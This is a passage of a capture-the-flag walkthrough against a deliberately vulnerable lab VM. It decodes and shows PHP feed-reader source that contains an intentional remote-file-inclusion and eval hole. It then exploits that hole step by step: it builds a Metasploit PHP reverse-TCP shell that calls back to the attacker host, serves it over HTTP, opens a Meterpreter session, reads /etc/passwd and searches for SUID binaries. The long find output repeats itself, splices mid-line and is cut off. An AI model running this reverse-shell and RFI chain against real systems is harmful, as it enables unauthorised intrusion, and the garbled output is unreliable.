NiI7CgogICAgICAgICAgICAvLyBJZiB5b3UgY2FuIHVzZSB0aGUgZm9sbG93aW5nIGNvZGUgZm9yIGEgdGltaW5nIGF0dGFjawogICAgICAgICAgICAvLyB0aGVuIGdvb2QgbHVjayA6KSBCdXQuLiBZb3UgaGF2ZSB0aGUgc291cmNlIGFueXdheSwgcmlnaHQ/IDopIAoJICAgIGlmKHN0cmNtcCgkaGFzaGVka2V5LCAkc2VjcmV0KSA9PSAwKSB7CiAgICAgICAgICAgICAgICAkc2VjcmV0b2sgPSB0cnVlOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZGllKCJTb3JyeS4uLiBBdXRoZW50aWNhdGlvbiBmYWlsZWQuIEtleSB3YXMgaW52YWxpZC4iKTsKCSAgICB9CgogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGRpZSgiQXV0aGVudGljYXRpb24gaW52YWxpZC4gWW91IG1pZ2h0IG5lZWQgYSBrZXkuIik7CiAgICAgICAgfQogICAgfQoKICAgIC8vIEp1c3QgdG8gbWFrZSBzdXJlIHRoZSBhYm92ZSBrZXkgY2hlY2sgd2FzIHBhc3NlZC4KICAgIGlmKCEkc2VjcmV0b2spIHsKICAgICAgICBkaWUoIlNvbWV0aGluZyB3ZW50IHdyb25nIHdpdGggdGhlIGF1dGhlbnRpY2F0aW9uIHByb2Nlc3MiKTsKICAgIH0KCiAgICAvLyBOb3cgbG9hZCB0aGUgY29udGVudHMgb2YgdGhlIGZpbGUgd2UgYXJlIHJlYWRpbmcsIGFuZCBwYXJzZQogICAgLy8gdGhlIHN1cGVyIGF3ZXNvbWVuZXNzIG9mIGl0cyBjb250ZW50cyEKICAgICRmID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7CgogICAgJHRleHQgPSBwcmVnX3NwbGl0KCIvIyN0ZXh0IyMvcyIsICRmKTsKCiAgICBpZihpc3NldCgkdGV4dFsnMSddKSAmJiBzdHJsZW4oJHRleHRbJzEnXSkgPiAwKSB7CiAgICAgICAgcHJpbnQoJHRleHRbJzEnXSk7CiAgICB9CgogICAgcHJpbnQgIjxiciAvPjxiciAvPiI7CgogICAgJHBocCA9IHByZWdfc3BsaXQoIi8jI3BocCMjL3MiLCAkZik7CgogICAgaWYoaXNzZXQoJHBocFsnMSddKSAmJiBzdHJsZW4oJHBocFsnMSddKSA+IDApIHsgCiAgICAgICAgZXZhbCgkcGhwWycxJ10pOwogICAgICAgIC8vICJJZiBFdmFsIGlzIHRoZSBhbnN3ZXIsIHlvdSdyZSBhc2tpbmcgdGhlIHdyb25nIHF1ZXN0aW9uISIgLSBTRwogICAgICAgIC8vIEl0IGh1cnRzIG1lIHRvIHdyaXRlIGluc2VjdXJlIGNvZGUgbGlrZSB0aGlzLCBidXQgaXQgaXMgaW4gdGhlCiAgICAgICAgLy8gbmFtZSBvZiBlZHVjYXRpb24sIGFuZCBGVU4sIHNvIEknbGwgbGV0IGl0IHNsaWRlIHRoaXMgdGltZS4KICAgIH0KfQoK" | base64 -d
<?php
defined ('VIAINDEX') or die('Ooooh! So close..');
?>
<h1>Feed Reader</h1>
<?php
if(isset($_GET['url'])) {
    $url = $_GET['url'];
} else {
    print("<a href=\"?p=reader&url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt\">Load Feed</a>");
}

if(isset($url) && strlen($url) != '') {

    // Setup some variables.
    $secretok = false;
    $keyneeded = true;

    // Localhost as a source doesn't need to use the key.
    if(preg_match("#^http://127.0.0.1#", $url)) {
        $keyneeded = false;
        $secretok = true;
    }

    // Handle the key validation when it's needed.
    if($keyneeded) {
        $key = $_GET['key'];
        if(is_array($key)) {
            die("Array trick is mitigated ;)");
        }
        if(isset($key) && strlen($key) == '47') {
	    $hashedkey = hash('sha256', $key);
            $secret = "5ccd0dbdeefbee078b88a6e52db8c1caa8dd8315f227fe1e6aee6bcb6db63656";

            // If you can use the following code for a timing attack
            // then good luck :) But.. You have the source anyway, right? :) 
	    if(strcmp($hashedkey, $secret) == 0) {
                $secretok = true;
            } else {
                die("Sorry... Authentication failed. Key was invalid.");
	    }

        } else {
            die("Authentication invalid. You might need a key.");
        }
    }

    // Just to make sure the above key check was passed.
    if(!$secretok) {
        die("Something went wrong with the authentication process");
    }

    // Now load the contents of the file we are reading, and parse
    // the super awesomeness of its contents!
    $f = file_get_contents($url);

    $text = preg_split("/##text##/s", $f);

    if(isset($text['1']) && strlen($text['1']) > 0) {
        print($text['1']);
    }

    print "<br /><br />";

    $php = preg_split("/##php##/s", $f);

    if(isset($php['1']) && strlen($php['1']) > 0) { 
        eval($php['1']);
        // "If Eval is the answer, you're asking the wrong question!" - SG
        // It hurts me to write insecure code like this, but it is in the
        // name of education, and FUN, so I'll let it slide this time.
    }
}

root@kali:/media/bobdisk# 
```

The reader page allows RFI, with parameters url=self hosted php shell, key= flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b} (previous flag4)
Payload creation
```bash
root@kali:/tmp# cd /tmp
root@kali:/tmp# msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.100.102 LPORT=4444 > shell.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 27033 bytes

root@kali:/tmp#
```

Payload serving via python
```bash
root@kali:/tmp# python -m SimpleHTTPServer 5000
Serving HTTP on 0.0.0.0 port 5000 ...
```

Payload call

```bash
root@kali:~# firefox "http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=reader&key=4e44db0f1edc3c361dbf54eaf4df40352db91f8b&url=http://192.168.100.102:5000/shell.php"
```

Payload serving

```bash
root@kali:/tmp# cd /tmp
root@kali:/tmp# python -m SimpleHTTPServer 5000
Serving HTTP on 0.0.0.0 port 5000 ...
192.168.100.101 - - [04/May/2017 08:43:51] "GET /shell.php HTTP/1.0" 200 -

```

Handle meterpreter

```bash
root@kali:/tmp# sed -i 's/<?php/##php##/g' shell.php
root@kali:~# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter_reverse_tcp; set LHOST 192.168.100.102; set LPORT 4444; run"
PAYLOAD => php/meterpreter_reverse_tcp
LHOST => 192.168.100.102
LPORT => 4444
[*] Started reverse TCP handler on 192.168.100.102:4444 
[*] Starting the payload handler...
[*] Meterpreter session 1 opened (192.168.100.102:4444 -> 192.168.100.101:34924) at 2017-05-04 09:07:44 +0200

meterpreter > sysinfo 
Computer    : skuzzy
OS          : Linux skuzzy 4.4.0-64-generic #85-Ubuntu SMP Mon Feb 20 11:50:30 UTC 2017 x86_64
Meterpreter : php/linux
meterpreter >  
```

Enumeartion

```bash
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
skuzzy:x:1000:1000:skuzzy skuzbucket,,,:/home/skuzzy:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
meterpreter >
meterpreter > shell
Process 2878 created.
Channel 15 created.
find / -perm /4000 2>&1 | grep -v 'permission denied'
find: '/tmp/systemd-private-0dde0c27c8f24c1094cf23211c051214-systemd-timesyncd.service-D1Wc4O': Permission denied
find: '/etc/ssl/private': Permission denied
find: '/etc/polkit-1/localauthority': Permission denied
find: '/proc/tty/driver': Permission denied
find: '/proc/1/task/1/fd': Permission denied
find: '/proc/1/task/1/fdinfo': Permission denied
find: '/proc/1/task/1/ns': Permission denied
find: '/proc/1/fd': Permission denied
find: '/proc/1/map_files': Permission denied
find: '/proc/1/fdinfo': Permission denied
find: '/proc/1/ns': Permission denied
find: '/proc/2/task/2/fd': Permission denied
find: '/proc/2/task/2/fdinfo': Permission denied
find: '/proc/2/task/2/ns': Permission denied
find: '/proc/2/fd': Permission denied
find: '/proc/2/map_files': Permission denied
find: '/proc/2/fdinfo': Permission denied
find: '/proc/2/ns': Permission denied
find: '/proc/3/task/3/fd': Permission denied
find: '/proc/3/task/3/fdinfo': Permission denied
find: '/proc/3/task/3/ns': Permission denied
find: '/proc/3/fd': Permission denied
find: '/proc/3/map_files': Permission denied
find: '/proc/3/fdinfo': Permission denied
find: '/proc/3/ns': Permission denied
find: '/proc/4/task/4/fd': Permission denied
find: '/proc/4/task/4/fdinfo': Permission denied
find: '/proc/4/task/4/ns': Permission denied
find: '/proc/4/fd': Permission denied
find: '/proc/4/map_files': Permission denied
find: '/proc/4/fdinfo': Permission denied
find: '/proc/4/ns': Permission denied
find: '/proc/5/task/5/fd': Permission denied
find: '/proc/5/task/5/fdinfo': Permission denied
find: '/proc/5/task/5/ns': Permission denied
find: '/proc/5/fd': Permission denied
find: '/proc/5/map_files': Permission denied
find: '/proc/5/fdinfo': Permission denied
find: '/proc/5/ns': Permission denied
find: '/proc/7/task/7/fd': Permission denied
find: '/proc/7/task/7/fdinfo': Permission denied
find: '/proc/7/task/7/ns': Permission denied
find: '/proc/7/fd': Permission denied
find: '/proc/7/map_files': Permission denied
find: '/proc/7/fdinfo': Permission denied
find: '/proc/7/ns': Permission denied
find: '/proc/8/task/8/fd': Permission denied
find: '/proc/8/task/8/fdinfo': Permission denied
find: '/proc/8/task/8/ns': Permission denied
find: '/proc/8/fd': Permission denied
find: '/proc/8/map_files': Permission denied
find: '/proc/8/fdinfo': Permission denied
find: '/proc/8/ns': Permission denied
find: '/proc/9/task/9/fd': Permission denied
find: '/proc/9/task/9/fdinfo': Permission denied
find: '/proc/9/task/9/ns': Permission denied
find: '/proc/9/fd': Permission denied
find: '/proc/9/map_files': Permission denied
find: '/proc/9/fdinfo': Permission denied
find: '/proc/9/ns': Permission denied
find: '/proc/10/task/10/fd': Permission denied
find: '/proc/10/task/10/fdinfo': Permission denied
find: '/proc/10/task/10/ns': Permission denied
find: '/proc/10/fd': Permission denied
find: '/proc/10/map_files': Permission denied
find: '/proc/10/fdinfo': Permission denied
find: '/proc/10/ns': Permission denied
find: '/proc/11/task/11/fd': Permission denied
find: '/proc/11/task/11/fdinfo': Permission denied
find: '/proc/11/task/11/ns': Permission denied
find: '/proc/11/fd': Permission denied
find: '/proc/11/map_files': Permission denied
find: '/proc/11/fdinfo': Permission denied
find: '/proc/11/ns': Permission denied
find: '/proc/12/task/12/fd': Permission denied
find: '/proc/12/task/12/fdinfo': Permission denied
find: '/proc/12/task/12/ns': Permission denied
find: '/proc/12/fd': Permission denied
find: '/proc/12/map_files': Permission denied
find: '/proc/12/fdinfo': Permission denied
find: '/proc/12/ns': Permission denied
find: '/proc/13/task/13/fd': Permission denied
find: '/proc/13/task/13/fdinfo': Permission denied
find: '/proc/13/task/13/ns': Permission denied
find: '/proc/13/fd': Permission denied
find: '/proc/13/map_files': Permission denied
find: '/proc/13/fdinfo': Permission denied
find: '/proc/13/ns': Permission denied
find: '/proc/14/task/14/fd': Permission denied
find: '/proc/14/task/14/fdinfo': Permission denied
find: '/proc/14/task/14/ns': Permission denied
find: '/proc/14/fd': Permission denied
find: '/proc/14/map_files': Permission denied
find: '/proc/14/fdinfo': Permission denied
find: '/proc/14/ns': Permission denied
find: '/proc/15/task/15/fd': Permission denied
find: '/proc/15/task/15/fdinfo': Permission denied
find: '/proc/15/task/15/ns': Permission denied
find: '/proc/15/fd': Permission denied
find: '/proc/15/map_files': Permission denied
find: '/proc/15/fdinfo': Permission denied
find: '/proc/15/ns': Permission denied
find: '/proc/16/task/16/fd': Permission denied
find: '/proc/16/task/16/fdinfo': Permission denied
find: '/proc/16/task/16/ns': Permission denied
find: '/proc/16/fd': Permission denied
find: '/proc/16/map_files': Permission denied
find: '/proc/16/fdinfo': Permission denied
find: '/proc/16/ns': Permission denied
find: '/proc/17/task/17/fd': Permission denied
find: '/proc/17/task/17/fdinfo': Permission denied
find: '/proc/17/task/17/ns': Permission denied
find: '/proc/17/fd': Permission denied
find: '/proc/17/map_files': Permission denied
find: '/proc/17/fdinfo': Permission denied
find: '/proc/17/ns': Permission denied
find: '/proc/18/task/18/fd': Permission denied
find: '/proc/18/task/18/fdinfo': Permission denied
find: '/proc/18/task/18/ns': Permission denied
find: '/proc/18/fd': Permission denied
find: '/proc/18/map_files': Permission denied
find: '/proc/18/fdinfo': Permission denied
find: '/proc/18/ns': Permission denied
finon denied
find: '/proc/14/map_files': Permission denied
find: '/proc/14/fdinfo': Permission denied
find: '/proc/14/ns': Permission denied
find: '/proc/15/task/15/fd': Permission denied
find: '/proc/15/task/15/fdinfo': Permission denied
find: '/proc/15/task/15/ns': Permission denied
find: '/proc/15/fd': Permission denied
find: '/proc/15/map_files': Permission denied
find: '/proc/15/fdinfo': Permission denied
find: '/proc/15/ns': Permission denied
find: '/proc/16/task/16/fd': Permission denied
find: '/proc/16/task/16/fdinfo': Permission denied
find: '/proc/16/task/16/ns': Permission denied
find: '/proc/16/fd': Permission denied
find: '/proc/16/map_files': Permission denied
find: '/proc/16/fdinfo': Permission denied
find: '/proc/16/ns': Permission denied
find: '/proc/17/task/17/fd': Permission denied
find: '/proc/17/task/17/fdinfo': Permission denied
find: '/proc/17/task/17/ns': Permission denied
find: '/proc/17/fd': Permission denied
find: '/proc/17/map_files': Permission denied
find: '/proc/17/fdinfo': Permission denied
find: '/proc/17/ns': Permission denied
find: '/proc/18/task/18/fd': Permission denied
find: '/proc/18/task/18/fdinfo': Permission denied
find: '/proc/18/task/18/ns': Permission denied
find: '/proc/18/fd': Permission denied
find: '/proc/18/map_files': Permission denied
find: '/proc/18/fdinfo': Permission denied
find: '/proc/18/ns': Permission denied
find: '/proc/19/task/19/fd': Permission denied
find: '/proc/19/task/19/fdinfo': Permission denied
find: '/proc/19/task/19/ns': Permission denied
find: '/proc/19/fd': Permission denied
find: '/proc/19/map_files': Permission denied
find: '/proc/19/fdinfo': Permission denied
find: '/proc/19/ns': Permission denied
find: '/proc/20/task/20/fd': Permission denied
find: '/proc/20/task/20/fdinfo': Permission denied
find: '/proc/20/task/20/ns': Permission denied
find: '/proc/20/fd': Permission denied
find: '/proc/20/map_files': Permission denied
find: '/proc/20/fdinfo': Permission denied
find: '/proc/20/ns': Permission denied
find: '/proc/21/task/21/fd': Permission denied
find: '/proc/21/task/21/fdinfo': Permission denied
find: '/proc/21/task/21/ns': Permission denied
find: '/proc/21/fd': Permission denied
find: '/proc/21/map_files': Permission denied
find: '/proc/21/fdinfo': Permission denied
find: '/proc/21/ns': Permission denied
find: '/proc/22/task/22/fd': Permission denied
find: '/proc/22/task/22/fdinfo': Permission denied
find: '/proc/22/task/22/ns': Permission denied
find: '/proc/22/fd': Permission denied
find: '/proc/22/map_files': Permission denied
find: '/proc/22/fdinfo': Permission denied
find: '/proc/22/ns': Permission denied
find: '/proc/23/task/23/fd': Permission denied
find: '/proc/23/task/23/fdinfo': Permission denied
find: '/proc/23/task/23/ns': Permission denied
find: '/proc/23/fd': Permission denied
find: '/proc/23/map_files': Permission denied
find: '/proc/23/fdinfo': Permission denied
find: '/proc/23/ns': Permission denied
find: '/proc/27/task/27/fd': Permission denied
find: '/proc/27/task/27/fdinfo': Permission denied
find: '/proc/27/task/27/ns': Permission denied
find: '/proc/27/fd': Permission denied
find: '/proc/27/map_files': Permission denied
find: '/proc/27/fdinfo': Permission denied
find: '/proc/27/ns': Permission denied
find: '/proc/28/task/28/fd': Permission denied
find: '/proc/28/task/28/fdinfo': Permission denied
find: '/proc/28/task/28/ns': Permission denied
find: '/proc/28/fd': Permission denied
find: '/proc/28/map_files': Permission denied
find: '/proc/28/fdinfo': Permission denied
find: '/proc/28/ns': Permission denied
find: '/proc/29/task/29/fd': Permission denied
find: '/proc/29/task/29/fdinfo': Permission denied
find: '/proc/29/task/29/ns': Permission denied
find: '/proc/29/fd': Permission denied
find: '/proc/29/map_files': Permission denied
find: '/proc/29/fdinfo': Permission denied
find: '/proc/29/ns': Permission denied
find: '/proc/30/task/30/fd': Permission denied
find: '/proc/30/task/30/fdinfo': Permission denied
find: '/proc/30/task/30/ns': Permission denied
find: '/proc/30/fd': Permission denied
find: '/proc/30/map_files': Permission denied
find: '/proc/30/fdinfo': Permission denied
find: '/proc/30/ns': Permission denied
find: '/proc/46/task/46/fd': Permission denied
find: '/proc/46/task/46/fdinfo': Permission denied
find: '/proc/46/task/46/ns': Permission denied
find: '/proc/46/fd': Permission denied
find: '/proc/46/map_files': Permission denied
find: '/proc/46/fdinfo': Permission denied
find: '/proc/46/ns': Permission denied
find: '/proc/47/task/47/fd': Permission denied
find: '/proc/47/task/47/fdinfo': Permission denied
find: '/proc/47/task/47/ns': Permission denied
find: '/proc/47/fd': Permission denied
find: '/proc/47/map_files': Permission denied
find: '/proc/47/fdinfo': Permission denied
find: '/proc/47/ns': Permission denied
find: '/proc/48/task/48/fd': Permission denied
find: '/proc/48/task/48/fdinfo': Permission denied
find: '/proc/48/task/48/ns': Permission denied
find: '/proc/48/fd': Permission denied
find: '/proc/48/map_files': Permission denied
find: '/proc/48/fdinfo': Permission denied
find: '/proc/48/ns': Permission denied
find: '/proc/49/task/49/fd': Permission denied
find: '/proc/49/task/49/fdinfo': Permission denied
find: '/proc/49/task/49/ns': Permission denied
find: '/proc/49/fd': Permission denied
find: '/proc/49/map_files': Permission denied
find: '/proc/49/fdinfo': Permission denied
find: '/proc/49/ns': Permission denied
find: '/proc/50/task/50/fd': Permission denied
find: '/proc/50/task/50/fdinfo': Permission denied
find: '/proc/50/task/50/ns': Permission denied
find: '/proc/50/fd': Permission denied
find: '/proc/50/map_files': Permission denied
find: '/proc/50/fdinfo': Permission denied
find: '/proc/50/ns': Permission denied
find: '/proc/51/task/51/fd': Permission denied
find: '/proc/51/task/51/fdinfo': Permission denied
find: '/proc/51/task/51/ns': Permission denied
find: '/proc/51/fd': Permission denied
find: '/proc/51/map_files': Permission denied
find: '/proc/51/fdinfo': Permission denied
find: '/proc/51/ns': Permission denied
find: '/proc/52/task/52/fd': Permission denied
find: '/proc/52/task/52/fdinfo': Permission denied
find: '/proc/52/task/52/ns': Permission denied
find: '/proc/52/fd': Permission denied
find: '/proc/52/map_files': Permission denied
find: '/proc/52/fdinfo': Permission denied
find: '/proc/52/ns': Permission denied
find: '/proc/53/task/53/fd': Permission denied
find: '/proc/53/task/53/fdinfo': Permission denied
find: '/proc/53/task/53/ns': Permission denied
find: '/proc/53/fd': Permission denied
find: '/proc/53/map_files': Permission denied
find: '/proc/53/fdinfo': Permission denied
find: '/proc/53/ns': Permission denied
find: '/proc/54/task/54/fd': Permission denied
find: '/proc/54/task/54/fdinfo': Permission denied
find: '/proc/54/task/54/ns': Permission denied
find: '/proc/54/fd': Permission denied
find: '/proc/54/map_files': Permission denied
find: '/proc/54/fdinfo': Permission denied
find: '/proc/54/ns': Permission denied
find: '/proc/55/task/55/fd': Permission denied
find: '/proc/55/task/55/fdinfo': Permission denied
find: '/proc/55/task/55/ns': Permission denied
find: '/proc/55/fd': Permission denied
find: '/proc/55/map_files': Permission denied
find: '/proc/55/fdinfo': Permission denied
find: '/proc/55/ns': Permission denied
find: '/proc/56/task/56/fd': Permission denied
find: '/proc/56/task/56/fdinfo': Permission denied
find: '/proc/56/task/56/ns': Permission denied
find: '/proc/56/fd': Permission denied
find: '/proc/56/map_files': Permission denied
find: '/proc/56/fdinfo': Permission denied
find: '/proc/56/ns': Permission denied
find: '/proc/57/task/57/fd': Permission denied
find: '/proc/57/task/57/fdinfo': Permission denied
find: '/proc/57/task/57/ns': Permission denied
find: '/proc/57/fd': Permission denied
find: '/proc/57/map_files': Permission denied
find: '/proc/57/fdinfo': Permission denied
find: '/proc/57/ns': Permission denied
find: '/proc/58/task/58/fd': Permission denied
find: '/proc/58/task/58/fdinfo': Permission denied
find: '/proc/58/task/58/ns': Permission denied
find: '/proc/58/fd': Permission denied
find: '/proc/58/map_files': Permission denied
find: '/proc/58/fdinfo': Permission denied
find: '/proc/58/ns': Permission denied
find: '/proc/59/task/59/fd': Permission denied
find: '/proc/59/task/59/fdinfo': Permission denied
find: '/proc/59/task/59/ns': Permission denied
find: '/proc/59/fd': Permission denied
find: '/proc/59/map_files': Permission denied
find: '/proc/59/fdinfo': Permission denied
find: '/proc/59/ns': Permission denied
find: '/proc/60/task/60/fd': Permission denied
find: '/proc/60/task/60/fdinfo': Permission denied
find: '/proc/60/task/60/ns': Permission denied
find: '/proc/60/fd': Permission denied
find: '/proc/60/map_files': Permission denied
find: '/proc/60/fdinfo': Permission denied
find: '/proc/60/ns': Permission denied
find: '/proc/61/task/61/fd': Permission denied
find: '/proc/61/task/61/fdinfo': Permission denied
find: '/proc/61/task/61/ns': Permission denied
find: '/proc/61/fd': Permission denied
find: '/proc/61/map_files': Permission denied
find: '/proc/61/fdinfo': Permission denied
find: '/proc/61/ns': Permission denied
find: '/proc/62/task/62/fd': Permission denied
find: '/proc/62/task/62/fdinfo': Permission denied
find: '/proc/62/task/62/ns': Permission denied
find: '/proc/62/fd': Permission denied
find: '/proc/62/map_files': Permission denied
find: '/proc/62/fdinfo': Permission denied
find: '/proc/62/ns': Permission denied
find: '/proc/63/task/63/fd': Permission denied
find: '/proc/63/task/63/fdinfo': Permission denied
find: '/proc/63/task/63/ns': Permission denied
find: '/proc/63/fd': Permission denied
find: '/proc/63/map_files': Permission denied
find: '/proc/63/fdinfo': Permission denied
find: '/proc/63/ns': Permission denied
find: '/proc/64/task/64/fd': Permission denied
find: '/proc/64/task/64/fdinfo': Permission denied
find: '/proc/64/task/64/ns': Permission denied
find: '/proc/64/fd': Permission denied
find: '/proc/64/map_files': Permission denied
find: '/proc/64/fdinfo': Permission denied
find: '/proc/64/ns': Permission denied
find: '/proc/65/task/65/fd': Permission denied
find: '/proc/65/task/65/fdinfo': Permission denied
find: '/proc/65/task/65/ns': Permission denied
find: '/proc/65/fd': Permission denied
find: '/proc/65/map_files': Permission denied
find: '/proc/65/fdinfo': Permission denied
find: '/proc/65/ns': Permission denied
find: '/proc/66/task/66/fd': Permission denied
find: '/proc/66/task/66/fdinfo': Permission denied
find: '/proc/66/task/66/ns': Permission denied
find: '/proc/66/fd': Permission denied
find: '/proc/66/map_files': Permission denied
find: '/proc/66/fdinfo': Permission denied
find: '/proc/66/ns': Permission denied
find: '/proc/67/task/67/fd': Permission denied
find: '/proc/67/task/67/fdinfo': Permission denied
find: '/proc/67/task/67/ns': Permission denied
find: '/proc/67/fd': Permission denied
find: '/proc/67/map_files': Permission denied
find: '/proc/67/fdinfo': Permission denied
find: '/proc/67/ns': Permission denied
find: '/proc/68/task/68/fd': Permission denied
find: '/proc/68/task/68/fdinfo': Permission denied
find: '/proc/68/task/68/ns': Permission denied
find: '/proc/68/fd': Permission denied
find: '/proc/68/map_files': Permission denied
find: '/proc/68/fdinfo': Permission denied
find: '/proc/68/ns': Permission denied
find: '/proc/69/task/69/fd': Permission denied
find: '/proc/69/task/69/fdinfo': Permission denied
find: '/proc/69/task/69/ns': Permission denied
find: '/proc/69/fd': Permission denied
find: '/proc/69/map_files': Permission denied
find: '/proc/69/fdinfo': Permission denied
find: '/proc/69/ns': Permission denied
find: '/proc/70/task/70/fd': Permission denied
find: '/proc/70/task/70/fdinfo': Permission denied
find: '/proc/70/task/70/ns': Permission denied
find: '/proc/70/fd': Permission denied
find: '/proc/70/map_files': Permission denied
find: '/proc/70/fdinfo': Permission denied
find: '/proc/70/ns': Permission denied
find: '/proc/71/task/71/fd': Permission denied
find: '/proc/71/task/71/fdinfo': Permission denied
find: '/proc/71/task/71/ns': Permission denied
find: '/proc/71/fd': Permission denied
find: '/proc/71/map_files': Permission denied
find: '/proc/71/fdinfo': Permission denied
find: '/proc/71/ns': Permission denied
find: '/proc/72/task/72/fd': Permission denied
find: '/proc/72/task/72/fdinfo': Permission denied
find: '/proc/72/task/72/ns': Permission denied
find: '/proc/72/fd': Permission denied
find: '/proc/72/map_files': Permission denied
find: '/proc/72/fdinfo': Permission denied
find: '/proc/72/ns': Permission denied
find: '/proc/73/task/73/fd': Permission denied
find: '/proc/73/task/73/fdinfo': Permission denied
find: '/proc/73/task/73/ns': Permission denied
find: '/proc/73/fd': Permission denied
find: '/proc/73/map_files': Permission denied
find: '/proc/73/fdinfo': Permission denied
find: '/proc/73/ns': Permission denied
find: '/proc/74/task/74/fd': Permission denied
find: '/proc/74/task/74/fdinfo': Permission denied
find: '/proc/74/task/74/ns': Permission denied
find: '/proc/74/fd': Permission denied
find: '/proc/74/map_files': Permission denied
find: '/proc/74/fdinfo': Permission denied
find: '/proc/74/ns': Permission denied
find: '/proc/75/task/75/fd': Permission denied
find: '/proc/75/task/75/fdinfo': Permission denied
find: '/proc/75/task/75/ns': Permission denied
find: '/proc/75/fd': Permission denied
find: '/proc/75/map_files': Permission denied
find: '/proc/75/fdinfo': Permission denied
find: '/proc/75/ns': Permission denied
find: '/proc/81/task/81/fd': Permission denied
find: '/proc/81/task/81/fdinfo': Permission denied
find: '/proc/81/task/81/ns': Permission denied
find: '/proc/81/fd': Permission denied
find: '/proc/81/map_files': Permission denied
find: '/proc/81/fdinfo': Permission denied
find: '/proc/81/ns': Permission denied
find: '/proc/94/task/94/fd': Permission denied
find: '/proc/94/task/94/fdinfo': Permission denied
find: '/proc/94/task/94/ns': Permission denied
find: '/proc/94/fd': Permission denied
find: '/proc/94/map_files': Permission denied
find: '/proc/94/fdinfo': Permission denied
find: '/proc/94/ns': Permission denied
find: '/proc/95/task/95/fd': Permission denied
find: '/proc/95/task/95/fdinfo': Permission denied
find: '/proc/95/task/95/ns': Permission denied
find: '/proc/95/fd': Permission denied
find: '/proc/95/map_files': Permission denied
find: '/proc/95/fdinfo': Permission denied
find: '/proc/95/ns': Permission denied
find: '/proc/96/task/96/fd': Permission denied
find: '/proc/96/task/96/fdinfo': Permission denied
find: '/proc/96/task/96/ns': Permission denied
find: '/proc/96/fd': Permission denied
find: '/proc/96/map_files': Permission denied
find: '/proc/96/fdinfo': Permission denied
find: '/proc/96/ns': Permission denied
find: '/proc/142/task/142/fd': Permission denied
find: '/proc/142/task/142/fdinfo': Permission denied
find: '/proc/142/task/142/ns': Permission denied
find: '/proc/142/fd': Permission denied
find: '/proc/142/map_files': Permission denied
find: '/proc/142/fdinfo': Permission denied
find: '/proc/142/ns': Permission denied
find: '/proc/148/task/148/fd': Permission denied
find: '/proc/148/task/148/fdinfo': Permission denied
find: '/proc/148/task/148/ns': Permission denied
find: '/proc/148/fd': Permission denied
find: '/proc/148/map_files': Permission denied
find: '/proc/148/fdinfo': Permission denied
find: '/proc/148/ns': Permission denied
find: '/proc/149/task/149/fd': Permission denied
find: '/proc/149/task/149/fdinfo': Permission denied
find: '/proc/149/task/149/ns': Permission denied
find: '/proc/149/fd': Permission denied
find: '/proc/149/map_files': Permission denied
find: '/proc/149/fdinfo': Permission denied
find: '/proc/149/ns': Permission denied
find: '/proc/155/task/155/fd': Permission denied
find: '/proc/155/task/155/fdinfo': Permission denied
find: '/proc/155/task/155/ns': Permission denied
find: '/proc/155/fd': Permission denied
find: '/proc/155/map_files': Permission denied
find: '/proc/155/fdinfo': Permission denied
find: '/proc/155/ns': Permission denied
find: '/proc/196/task/196/fd': Permission denied
find: '/proc/196/task/196/fdinfo': Permission denied
find: '/proc/196/task/196/ns': Permission denied
find: '/proc/196/fd': Permission denied
find: '/proc/196/map_files': Permission denied
find: '/proc/196/fdinfo': Permission denied
find: '/proc/196/ns': Permission denied
find: '/proc/270/task/270/fd': Permission denied
find: '/proc/270/task/270/fdinfo': Permission denied
find: '/proc/270/task/270/ns': Permission denied
find: '/proc/270/fd': Permission denied
find: '/proc/270/map_files': Permission denied
find: '/proc/270/fdinfo': Permission denied
find: '/proc/270/ns': Permission denied
find: '/proc/305/task/305/fd': Permission denied
find: '/proc/305/task/305/fdinfo': Permission denied
find: '/proc/305/task/305/ns': Permission denied
find: '/proc/305/fd': Permission denied
find: '/proc/305/map_files': Permission denied
find: '/proc/305/fdinfo': Permission denied
find: '/proc/305/ns': Permission denied
find: '/proc/331/task/331/fd': Permission denied
find: '/proc/331/task/331/fdinfo': Permission denied
find: '/proc/331/task/331/ns': Permission denied
find: '/proc/331/fd': Permission denied
